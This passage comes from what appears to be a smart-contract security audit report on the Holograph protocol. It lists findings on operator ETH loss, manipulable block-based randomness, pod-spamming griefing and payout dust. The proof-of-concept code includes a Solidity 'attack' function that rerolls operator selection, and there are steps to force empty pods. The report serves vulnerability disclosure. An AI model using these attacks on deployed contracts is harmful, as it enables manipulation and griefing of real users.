class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">isJobExecuted</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk4\">false</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBalance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">operatorMock</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk7\">500</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">});</span></span></span></code></pre>\n<p>Last, please run <code>npx hardhat test test/POC.ts --network hardhat</code>. The <code>It is possible that operator loses sent ETH after calling HolographOperator contract's executeJob function</code> test will pass to demonstrate the described scenario.</p>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In the <code>catch</code> block of the <code>try ... {...} catch {...}</code> code mentioned above in the Impact section, the code can be updated to transfer the <code>msg.value</code> amount of ETH back to the operator, which is <code>msg.sender</code> for the <code>HolographOperator</code> contract’s <code>executeJob</code> function, when this described situation occurs.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/418#issuecomment-1308898962\">ACC01ADE (Holograph) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Good catch, good POC.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/418\">gzeon (judge) decreased severity to Medium</a></strong></p>\n<hr>\n<h2 id=\"m-06-bad-source-of-randomness\" style=\"position:relative;\"><a href=\"#m-06-bad-source-of-randomness\" aria-label=\"m 06 bad source of randomness permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/427\">[M-06] Bad source of randomness</a></h2>\n<p><em>Submitted by minhtrng, also found by __141345__, adriro, cdahlheimer, d3e4, Deivitto, ladboy233, nadin, teawaterwire, and V_B</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L491-L511\">HolographOperator.sol#L491-L511</a><br></p>\n<p>Using <code>block.number</code> and <code>block.timestamp</code> as a source of randomness is commonly advised against, as the outcome can be manipulated by calling contracts. In this case a compromised layer-zero-endpoint would be able to retry the selection of the primary operator until the result is favorable to the malicious actor.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>An attack path for rerolling the result of bad randomness might look roughly like this:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">attack</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentNonce</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wantedPodIndex</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numPods</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wantedOperatorIndex</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numOperators</span><span class=\"mtk1\">,  </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bridgeInRequestPayload</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">jobHash</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bridgeInRequestPayload</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//same calculation as in HolographOperator.crossChainMessage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">random</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">jobHash</span><span class=\"mtk1\">, </span><span class=\"mtk12\">currentNonce</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wantedPodIndex</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">random</span><span class=\"mtk1\"> % </span><span class=\"mtk12\">numPods</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wantedOperatorIndex</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">random</span><span class=\"mtk1\"> % </span><span class=\"mtk12\">numOperators</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">operator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">crossChainMessage</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bridgeInRequestPayload</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The attack basically consists of repeatedly calling the <code>attack</code> function with data that is known and output that is wished for until the results match and only then continuing to calling the operator.</p>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider using a decentralized oracle for the generation of random numbers, such as <a href=\"https://docs.chain.link/docs/vrf/v2/introduction/\">Chainlinks VRF</a>.</p>\n<p>It should be noted, that in this case there is a prerequirement of the layer-zero endpoint being compromised, which confines the risk quite a bit, so using a normally unrecommended source of randomness could be acceptable here, considering the tradeoffs of integrating a decentralized oracle.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/427#issuecomment-1308894416\">ACC01ADE (Holograph) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Very valid issue.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/427#issuecomment-1320939907\">gzeon (judge) commented</a>:</strong></p>\n<blockquote>\n<p>While sponsor noted this is a design choice to use pseudorandomness, as pointed out by the warden a compromised layer-zero-endpoint can exploit this for profit, judging this as Medium risk.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-07--attacker-can-force-chaotic-operator-behavior\" style=\"position:relative;\"><a href=\"#m-07--attacker-can-force-chaotic-operator-behavior\" aria-label=\"m 07  attacker can force chaotic operator behavior permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/432\">[M-07]  Attacker can force chaotic operator behavior</a></h2>\n<p><em>Submitted by Trust, also found by csanuragjain</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L875\">HolographOperator.sol#L875</a><br></p>\n<p>Operators are organized into different pod tiers. Every time a new request arrives, it is scheduled to a random available pod. It is important to note that pods may be empty, in which case the pod array actually has a single zero element to help with all sorts of bugs. When a pod of a non existing tier is created, any intermediate tiers between the current highest tier to the new tier are filled with zero elements. This happens at bondUtilityToken():</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (_operatorPods.length &lt; pod) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  /**</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   * @dev activate pod(s) up until the selected pod</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  for (uint256 i = _operatorPods.length; i &lt;= pod; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /**</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     * @dev add zero address into pod to mitigate empty pod issues</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _operatorPods.push([address(0)]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>The issue is that any user can spam the contract with a large amount of empty operator pods. The attack would look like this:</p>\n<ol>\n<li>bondUtilityToken(attacker, large<em>amount, high</em>pod_number)</li>\n<li>unbondUtilityToken(attacker, attacker)</li>\n</ol>\n<p>The above could be wrapped in a flashloan to get virtually any pod tier filled.</p>\n<p>The consequence is that when the scheduler chooses pods uniformally, they will very likely choose an empty pod, with the zero address. Therefore, the chosen operator will be 0, which is referred to in the code as “open season”. In this occurrance, any operator can perform the executeJob() call. This is of course really bad, because all but one operator continually waste gas for executions that will be reverted after the lucky first transaction goes through. This would be a practical example of a griefing attack on Holograph.</p>\n<h3 id=\"impact-7\" style=\"position:relative;\"><a href=\"#impact-7\" aria-label=\"impact 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Any user can force chaotic “open season” operator behavior</p>\n<h3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>It is important to pay special attention to the scheduling algorithm, to make sure different pods are given execution time according to the desired heuristics.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/432#issuecomment-1308891591\">ACC01ADE (Holograph) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Good catch. This will be updated to mitigate.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-08-_payouteth-calculates-balance-with-an-offset-always-leaving-dust-eth-in-the-contract\" style=\"position:relative;\"><a href=\"#m-08-_payouteth-calculates-balance-with-an-offset-always-leaving-dust-eth-in-the-contract\" aria-label=\"m 08 _payouteth calculates balance with an offset always leaving dust eth in the contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/476\">[M-08] <code>_payoutEth()</code> calculates <code>balance</code> with an offset, always leaving dust <code>ETH</code> in the contract</a></h2>\n<p><em>Submitted by joestakey, also found by Aymen0909, d3e4, Jeiwan, joestakey, and Trust</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L391\">PA1D.sol#L391</a><br>\n<a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L395\">PA1D.sol#L395</a><br></p>\n<p>Payout recipients can call <code>getEthPayout()</code> to transfer the ETH balance of the contract to all payout recipients.<br>\nThis function makes an internal call to <code>_payoutEth</code>, which sends the payment to the recipients based on their associated <code>bp</code>.</p>\n<p>The issue is that the <code>balance</code> used in the <code>transfer</code> calls is not the contract ETH balance, but the balance minus a <code>gasCost</code>.</p>\n<p>This means <code>getEthPayout()</code> calls will leave dust in the contract.</p>\n<h3 id=\"impact-8\" style=\"position:relative;\"><a href=\"#impact-8\" aria-label=\"impact 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>If the dust is small enough, a subsequent call to <code>getEthPayout</code> is likely to revert because of <a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L390\">this check</a>.<br>\nAnd <code>enforcer/PA1D</code> does not have any other ETH withdrawal function. While <code>enforcer/PA1D</code> is meant to be used via delegate calls from a NFT collection contract, if the NFT contract does not have any withdrawal function either, this dust mentioned above is effectively lost.</p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Let us take the example of a payout recipient trying to retrieve their share of the balance, equal to <code>40_000</code> For simplicity, assume one payout address, owned by Alice:</p>\n<ul>\n<li>Alice calls <code>getEthPayout()</code>, which in turn calls <code>_payoutEth()</code></li>\n<li><code>gasCost = (23300 * length) + length = 23300 + 1 = 23301</code></li>\n<li><code>balance = address(this).balance = 40000</code></li>\n<li><code>balance - gasCost = 40000 - 23301 = 16699</code>,</li>\n<li><code>sending = ((bps[i] * balance) / 10000) = 10000 * 16699 / 10000 = 16699</code></li>\n<li>Alice receives <code>16699</code>.</li>\n</ul>\n<p>Alice has to wait for the balance to increase to call <code>getEthPayout()</code> again. But no matter what, there will always be at least a dust of <code>10000</code> left in the contract.</p>\n<h3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The transfers should be done based on <code>address(this).balance</code>. The <code>gasCost</code> is redundant as the gas amount is specified by the caller of <code>getEthPayout()</code>, the contract does not have to provide gas.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-391: balance = balance - gasCost;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">392:     uint256 sending;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">393:     // uint256 sent;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">394:     for (uint256 i = 0; i &lt; length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">395:       sending = ((bps[i] * balance) / 10000);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">396:       addresses[i].transfer(sending);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">397:       // sent = sent + sending;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">398:     }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/476#issuecomment-1294771534\">gzeon (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I think this is intended, a bit weird why 23300 is chosen, why gas price is not considered and why the withheld fund is not sent to the caller tho. Related to <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/164\"><code>#164</code></a> and <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/106\"><code>#106</code></a></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/476#issuecomment-1294789604\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>It doesn’t make sense that it’s intentional, because gas is never provided by contract, only EOA. Contract can only relay gas passed to it. But interesting to hear what the team says.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/476#issuecomment-1294821170\">gzeon (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Agreed, but still seems to be low risk.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/476#issuecomment-1307929686\">alexanderattar (Holograph) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>This is a valid issue and this function will be refactored.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/476#ref-pullrequest-1469977783\">alexanderattar (Holograph) linked a PR</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/holographxyz/holograph-protocol/pull/93\">Feature/holo 612 royalty smart contract improvements</a></p>\n</blockquote>\n<hr>\n<h2 id=\"m-09-holographerc20-breaks-composability-by-forcing-usage-of-draft-proposal-eip-4524\" style=\"position:relative;\"><a href=\"#m-09-holographerc20-breaks-composability-by-forcing-usage-of-draft-proposal-eip-4524\" aria-label=\"m 09 holographerc20 breaks composability by forcing usage of draft proposal eip 4524 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/440\">[M-09] <code>HolographERC20</code> breaks composability by forcing usage of draft proposal EIP-4524</a></h2>\n<p><em>Submitted by Trust</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L539\">HolographERC20.sol#L539</a><br></p>\n<p>HolographERC20 is the ERC20 enforcer for Holograph. In  the safeTransferFrom operation, it calls _checkOnERC20Received:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (_isEventRegistered(HolographERC20Event.beforeSafeTransfer)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  require(SourceERC20().beforeSafeTransfer(account, recipient, amount, data));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span 